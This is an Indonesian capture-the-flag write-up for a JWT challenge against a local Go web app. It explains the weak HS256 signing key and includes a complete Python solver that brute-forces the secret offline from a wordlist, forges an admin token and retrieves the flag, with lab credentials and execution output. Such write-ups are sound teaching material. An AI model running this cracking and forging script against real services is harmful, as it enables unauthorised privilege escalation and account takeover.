# WriteUp: Kunci Lemah

## Overview

* **Judul:** Kunci Lemah
* **Kategori:** Access Control
* **Poin:** 25
* **Deskripsi:** Jadi admin. Wordlist: `weak-secret.txt`.
* **URL:** `http://localhost:1337`

## Reconnaissance & Analysis

Tantangan ini melibatkan aplikasi web berbasis Go (Golang) yang menggunakan **JWT (JSON Web Token)** untuk otentikasi.

**1. Blackbox Analysis:**
Setelah login dengan kredensial `WanZKey:anyaunyu`, server memberikan cookie `token` dengan format standar JWT (`Header.Payload.Signature`). Header menunjukkan algoritma yang digunakan adalah **HS256 (HMAC-SHA256)**.

**2. Whitebox Analysis (Binary Reversing):**
Berdasarkan analisis file binary `weak-secret`:

* **Login Handler (`main.loginHandler`):** Menggunakan library `github.com/golang-jwt/jwt/v5` dengan metode signing `SigningMethodHS256`. Token ditandatangani menggunakan variabel global `main.jwtSecret`.
* **Dashboard Handler (`main.dashboardHandler`):** Memverifikasi token dan mengecek klaim `role`. Jika `role` bernilai `"admin"`, flag akan ditampilkan.

## Vulnerability Analysis

Kerentanan utama adalah **Weak Secret Key** (Kunci Rahasia Lemah).
Meskipun server memverifikasi tanda tangan (signature) token—berbeda dengan tantangan sebelumnya—kunci yang digunakan untuk *signing* ternyata sangat sederhana dan terdapat dalam wordlist umum (`weak-secret.txt`).

Hal ini memungkinkan penyerang untuk melakukan **Offline Brute-force Attack** terhadap signature JWT. Dengan mencoba menanda-tangani ulang header dan payload token asli menggunakan setiap kata dalam wordlist, penyerang dapat menemukan kunci yang menghasilkan signature yang identik dengan token asli.

## Exploitation

Proses eksploitasi dilakukan dengan langkah-langkah berikut:

1. **Capture Token:** Login sebagai user biasa untuk mendapatkan token valid.
2. **Crack Key:** Melakukan brute-force pada signature token menggunakan wordlist `weak-secret.txt`.
* **Hasil:** Kunci ditemukan: `'12345678'`.


3. **Forge Token:**
* Decode payload token.
* Ubah nilai `role` dari `"user"` menjadi `"admin"`.
* Sign token baru menggunakan kunci `'12345678'` dengan algoritma HS256.


4. **Access Dashboard:** Mengirim request ke `/dashboard` menggunakan token admin palsu.

**Script Solver (`exploit.py`):**

```python
import requests
import hashlib
import hmac
import base64
import json
import os

# Konfigurasi
TARGET_URL = "http://localhost:1337"
LOGIN_URL = f"{TARGET_URL}/login"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"
CREDS = {"username": "WanZKey", "password": "anyaunyu"}
WORDLIST_FILE = "weak-secret.txt"

def base64url_decode(data):
    rem = len(data) % 4
    if rem > 0: data += '=' * (4 - rem)
    return base64.urlsafe_b64decode(data)

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).replace(b'=', b'')

def sign_token(msg, key):
    return hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest()

def crack_jwt(token, wordlist_path):
    print(f"[*] Starting offline bruteforce on token...")
    header_b64, payload_b64, signature_b64 = token.split('.')
    message = f"{header_b64}.{payload_b64}"
    original_sig = base64url_decode(signature_b64)

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            if sign_token(message, secret) == original_sig:
                print(f"\n[+] KEY FOUND: '{secret}'")
                return secret
    return None

def exploit():
    s = requests.Session()
    # 1. Login
    print(f"[*] Logging in as {CREDS['username']}...")
    s.post(LOGIN_URL, data=CREDS)
    token = s.cookies.get("token")
    
    # 2. Crack Key
    secret_key = crack_jwt(token, WORDLIST_FILE)
    if not secret_key: return

    # 3. Forge Token
    print(f"[*] Forging Admin Token using key: {secret_key}")
    header_b64, payload_b64, _ = token.split('.')
    
    payload_json = json.loads(base64url_decode(payload_b64).decode())
    print(f"[*] Old Role: {payload_json['role']}")
    payload_json['role'] = 'admin' # Elevate Privilege
    print(f"[*] New Role: {payload_json['role']}")
    
    new_payload_b64 = base64url_encode(json.dumps(payload_json, separators=(',', ':')).encode()).decode()
    msg_to_sign = f"{header_b64}.{new_payload_b64}"
    new_sig_b64 = base64url_encode(sign_token(msg_to_sign, secret_key)).decode()
    
    forged_token = f"{msg_to_sign}.{new_sig_b64}"

    # 4. Access Dashboard
    print("[*] Accessing Dashboard...")
    r = requests.get(DASHBOARD_URL, cookies={"token": forged_token})

    if "pwn{" in r.text:
        print("\n" + "="*40)
        print("[+] PWNED! Flag Found:")
        for line in r.text.splitlines():
            if "pwn{" in line: print(f"    {line.strip()}")
        print("="*40 + "\n")

if __name__ == "__main__":
    exploit()

```

## Execution Output

```bash
$ ./exploit.py
[*] Logging in as WanZKey...
[+] Got Token: eyJhbGciOiJIUzI1NiIs...
[*] Starting offline bruteforce on token...

[+] KEY FOUND: '12345678'
[*] Forging Admin Token using key: 12345678
[*] Old Role: user
[*] New Role: admin
[*] Forged Token: eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...
[*] Accessing Dashboard...

========================================
[+] PWNED! Flag Found:
    <div class="flag">pwn{d73cacd63981908a1f287be930e9a801}</div>
========================================

```

## Flag

```
pwn{d73cacd63981908a1f287be930e9a801}

```
